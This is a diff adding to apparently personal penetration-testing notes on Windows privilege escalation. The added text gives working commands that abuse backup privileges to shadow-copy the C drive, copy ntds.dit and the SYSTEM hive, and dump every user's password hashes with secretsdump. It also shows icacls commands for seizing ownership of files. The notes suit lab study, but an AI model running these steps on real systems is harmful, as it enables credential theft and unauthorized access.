@@ -2,3 +2,24 @@
 - first enumerate and gather all info
 - using winpeas look for files/folders owned by system and we also have perms to read/write or execute refer to winpeas docs for the full form of codes displayed by winpeas over files/folders
 - we can leverage services which create proccess with system privs and hence get a system shell
+
+## escalation through certain privs
+### SeBackupPrivilege and SeRestorePrivilege
+If we have these 2 privs then what we can do is, we can create a backup of the C drive into some other drive of our choice(E drive here), this will also result in forming the backup of the C:\windows\ntds which we can use along with the master key extracted from system registry hive to decrypt the ntds file to get hashes of all users on that machine.
+This can be done by 1st copying this into a txt file
+```
+set verbose onX
+set metadata C:\Windows\Temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+and then using diskshadow to create a shadow copy(backup) of ther C drive via `diskshadow /s FILENAME.txt` FILENAME being the filename of the above txt file. Now our shadow copy is ready. Now we will use robocopy to copy the ntds from the E drive to our working directory via `robocopy /b E:\Windows\ntds . ntds.dit`. Now we have a copy of ntds, and are in need of the master key which needs the system registery hive, which can by saved via `reg save hklm\system "FULL PATH\system"` now we will transfer the ntds.dit file and system save file to our kali machine and use secretsdump's LOCAL mode to decrypt the ntds via `secretsdump.py LOCAL -ntds "PATH TO NTDS FILE" -system "PATH TO SYSTEM FILE"`
+
+### SeTakeOwnershipPrivilege
+Using this priv, we can simply take ownership of any file we want access to, and by taking ownership, we have full control over the object. We can take ownership of any object using icacls via 1st `icacls "FILENAME" /setowner "USERNAME"` and then `icacls "FILE NAME" /grant "USERNAME":F`
+
